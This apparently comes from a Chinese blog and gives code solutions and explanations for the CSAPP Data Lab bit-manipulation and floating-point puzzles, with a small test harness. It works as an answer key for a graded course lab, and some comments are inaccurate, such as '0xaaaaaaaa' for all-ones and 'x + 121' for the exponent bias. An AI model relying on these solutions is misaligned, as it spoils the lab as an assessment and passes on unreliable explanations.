最后将两种情况通过掩码合并。 1234567891011121314151617181920/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) &#123; //符号位 int s1 = x &gt;&gt; 31; int s2 = y &gt;&gt; 31; //s1 == s2 ? 1 : 0 int mask = !(s1 ^ s2); // y - x int diff = y + (~x) + 1; // y - x &gt;= 0 ? 1 : 0 int flag2 = !(diff &gt;&gt; 31); return (mask &amp; flag2) | ((!mask) &amp; (s1 &amp; 1));&#125; 9. logicalNeg 本题需要充分利用符号位，由于最终需要实现的结果是逻辑非，如何识别出0就十分关键。在allOddBits一题最后我们通过为-1 + 1和0 + 1实现能让全1转换为0，全0转换为1的方法，本题同样借鉴这个思路。而0的特点是，其补码和就是其本身，具有同样特性的还有0x80000000(也就是前面找到的最小数），通过观察发现他们的区别在于最小数最小数和其补数做或运算后最高位为1，而0做相同运算后结果为0。再利用其符号右移的特性，能构造出需要的0xAAAAAAAA(全1)或0。 123456789101112131415/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) &#123; int tag = x | (~x + 1); // 0xaaaaaaaa or 0 int s = tag &gt;&gt; 31; // 0 or 1 return s + 1;&#125; 10. howManyBits 首先我们可以通过给出的几组示例发现，对于任何数，相当于查看其原码表示的最小位数，我们可以先将负数转化为于之对应的补数，两者的最小表示位数相同，计算后记作y。 接着我们利用二进制数的表示思路来处理，也就是说，我们可以通过16、8、4、2、1这几个数表示1到31的任意数字，也就意味我们只要验证处理这几次就可以表示出位数来 处理时有技巧，我们从利用能取大的先取大的原则，不断缩小y(进行移位),如果不能移位则用小数再试。具体见代码 12345678910111213141516171819202122232425262728293031323334353637383940/* howManyBits - return the minimum number of bits required to represent x in * two&#x27;s complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) &#123; int mask, y, tag16, tag8, tag4, tag2, tag1, has16bit, has8bit, has4bit, has2bit, has1bit; //mask = x &lt; 0 ? 0xfffffffff : 0 mask = (x &gt;&gt; 31); //为负数去反 y = mask &amp; (~x) | (~mask) &amp; x; //判断是否满足16+1位 ? 1 : 0 tag16 = !!(y &gt;&gt; 16); has16bit = tag16 &lt;&lt; 4; y = y &gt;&gt; has16bit; //判断是否满足8位 ? 1 : 0 tag8 = !!(y &gt;&gt; 8); has8bit = (tag8 &lt;&lt; 3); y = y &gt;&gt; has8bit; //判断是否满足4位 ? 1 : 0 tag4 = !!(y &gt;&gt; 4); has4bit = tag4 &lt;&lt; 2; y = y &gt;&gt; has4bit; //判断是否满足2位 ? 1 : 0 tag2 = !!(y &gt;&gt; 2); has2bit = tag2 &lt;&lt; 1; y = y &gt;&gt; has2bit; //判断是否满足1位 ? 1 : 0 tag1 = !!(y &gt;&gt; 1); has1bit = tag1 &lt;&lt; 1; y = y &gt;&gt; has1bit; return has16bit + has8bit + has4bit + has2bit + has1bit + y + 1;&#125; 至此10道整数问题结束 浮点数规则细节 可以使用 可以使用循环和条件控制 使用int和unsigned，并可以使用任何运算符号 禁止使用 宏 定义或调用函数 使用非int和unsigned类型的数据 使用任何浮点运算符号 浮点数具体题解 1. floatScale2 只要熟悉浮点的规则就可以模拟出这个过程。 首先处理特殊情况（INF,NAN），其特点为M为0xff，此时返回这个数即可。 然后处理非标准数，需要确定是否会变成标准数，只要看E是否超过0x7fffff（也就是E所能表示的最大值即可）。 1234567891011121314151617181920212223242526272829303132/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int&#x27;s, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) &#123; unsigned s, M, E, ans; //分解出s, M, E s = uf &gt;&gt; 31; M = (uf &gt;&gt; 23) &amp; (0xff); E = uf &amp; (0x7fffff); if(M == 0xff)&#123; // NaN、Infinity的情况 return uf; &#125;else if(M == 0)&#123; //非规格化的情况 E = E &lt;&lt; 1; if(E &gt; 0x7fffff)&#123; // 判断是否会变成规格化 M = M + 1; E = E - 0x800000; &#125; &#125;else&#123; //规格化的情况 M = M + 1; &#125; ans = (s&lt;&lt;31) | (M &lt;&lt; 23) | E; return ans;&#125; floatFloat2Int 本题需要熟悉计算从浮点数转换为整数的规则，经过分析可以分为以下几种情况， 特殊值 NaN 和 infinity 的情况，会返回0x80000000u 非标准化的情况会返回0，因为非标准化表示的是小于1的数 实际阶数 a 满足a &lt; 0的数同样返回0，因为表示的数同样小于1 实际阶数 a 满足0 &lt;= a &lt;= 23的情况，保留整数部分的数，具体计算规则见代码 实际阶数 a 满足a &gt; 23，根据题目要求返回0x80000000u 其中非特殊情况还要加上符号位。 1234567891011121314151617181920212223242526272829303132333435363738/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) &#123; unsigned s, M, E ; int ans, a; //分解出s, M, E s = uf &gt;&gt; 31; M = (uf &gt;&gt; 23) &amp; (0xff); E = uf &amp; (0x7fffff); a = M - 127; //a表示实际的阶数 if(M == 0xff)&#123; // NaN、Infinity的情况 return 0x80000000u; &#125;else if(M == 0)&#123; //非规格化的情况 ans = 0; &#125;else if(a &lt; 0)&#123; // 阶数为负的情况 ans = 0; &#125;else if (a &lt;= 23)&#123; //阶数符合整数规则的情况 ans = (E &gt;&gt; (23 - a)) + (1 &lt;&lt; a); // printf(&quot;0x%x %d %d\\n&quot;,uf, ans, a+1); &#125;else&#123; //阶数溢出的情况 return 0x80000000u; &#125; if(s)&#123; ans = -ans; &#125; return ans;&#125; 3.floatPower2 一个小坑 :出现Timed out after 10 secs (probably infinite loop)的情况，应该是虚拟机性能不佳，绝对时间的超时。可以使用参数-T 20将执行限制时间改为20秒即可。 本题需要实现一个浮点数对2的幂计算，我们容易想到的是，浮点数本身计数方式就是以2的幂次形式，因此通过改变其中M的部分就可以实现大部分浮点运算。很容易想到的是当超出最大能表示数时返回0x7f800000（即无限大），当小到无法表示时，输出0。 但是事实上如果仅仅考虑阶数的问题，其实并没有得到正确答案，尽管这样做可以通过官方测试案例，但并不是正确答案。其实不应只靠考虑标准浮点数，非标准浮点数同样也应该考虑在内，我们把x + 121记作M，也就是真实阶数数，当阶数在0 =&lt; M &lt;= 23时能用非标准浮点数表示，详见代码如下。 12345678910111213141516171819202122232425262728/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) &#123; unsigned ans; //真实的阶数 int M = x + 127; if(M &gt; 0xff)&#123; //表示无穷大 ans = 0x7f800000; &#125;else if(M &gt; 0)&#123; // 表示在标准浮点数表示的部分 ans = M &lt;&lt; 23; &#125;else if(M &gt; -23)&#123; // 表示在非标准浮点数表示的部分 ans = 1 &lt;&lt; (M + 22); &#125;else&#123; // 小于浮点数表示的部分 ans = 0; &#125; return ans;&#125; 为了验证函数的正确性，我写了一个验证程序mytest.c在项目目录下简单测试 1234567891011121314151617181920212223242526#include &quot;tests.c&quot;#include &quot;bits.c&quot;#include &lt;assert.h&gt;#include &lt;stdio.h&gt;//每种情况的测试数据int test_data[] = &#123;0xfff, 12 - 127, 0 - 127, -20 - 127 , -23 - 127&#125;;int main()&#123; int size = sizeof(test_data) / sizeof(int); //重点测试数据 for(int i = -50; i &lt; 100; ++i)&#123; unsigned a, b; a = test_floatPower2(i-127); b = floatPower2(i - 127); printf(&quot;0x%u 0x%u\\n&quot;, a, b); assert(a == b); &#125; //自定数据测试 for(int i = 0; i &lt; size ; ++i)&#123; unsigned a, b; a = test_floatPower2(i); b = floatPower2(i); printf(&quot;0x%u 0x%u\\n&quot;, a, b); assert(a == b); &#125;&#125; 我们通过gcc -m32 -o mytest mytest.c编译后并执行./mytest。结果没有abort，一定程度验证正确性。 总结 最后附上最终测试结果 陆陆续续用了一周时间完成Lab1，我认为对计算机系统级的数据处理方式和技巧都有所学习，其中很多答案可能不是最优答案，欢迎大家留言讨论，共同学习。","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://lcjd99.github.io/categories/CSAPP/"}],"tags":[{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]}],"categories":[{"name":"docker","slug":"docker","permalink":"https://lcjd99.github.io/categories/docker/"},{"name":"git","slug":"git","permalink":"https://lcjd99.github.io/categories/git/"},{"name":"考研","slug":"考研","permalink":"https://lcjd99.github.io/categories/%E8%80%83%E7%A0%94/"},{"name":"others","slug":"others","permalink":"https://lcjd99.github.io/categories/others/"},{"name":"CS61C","slug":"CS61C","permalink":"https://lcjd99.github.io/categories/CS61C/"},{"name":"CSAPP","slug":"CSAPP","permalink":"https://lcjd99.github.io/categories/CSAPP/"}],"tags":[{"name":"utils","slug":"utils","permalink":"https://lcjd99.github.io/tags/utils/"},{"name":"Computer Organization","slug":"Computer-Organization","permalink":"https://lcjd99.github.io/tags/Computer-Organization/"},{"name":"C","slug":"C","permalink":"https://lcjd99.github.io/tags/C/"}]}